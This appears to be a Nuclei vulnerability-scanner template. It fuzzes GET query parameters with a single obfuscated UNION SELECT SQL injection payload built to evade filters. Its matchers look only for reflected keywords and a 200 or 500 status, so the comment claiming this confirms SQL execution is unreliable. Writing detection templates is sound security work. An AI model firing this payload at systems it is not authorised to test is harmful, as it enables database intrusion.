id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: medium
  description: |
    This template is designed to detect SQL injection vulnerabilities using a specified payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "%3CF5%3E/strrr/821}+union+%23%0a+distinctrow%0b/**/select+1,2,3--{%3CF5%3E/**/TRUE"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "select"                    # Look for SQL keywords in the response
          - "distinct"                  # To confirm SQL execution
          - "TRUE"                      # Check for our specific payload's effect

      - type: status
        status:
          - 200                         # OK status code, indicating the response was successful
          - 500                         # Internal Server Error, which may indicate a SQL error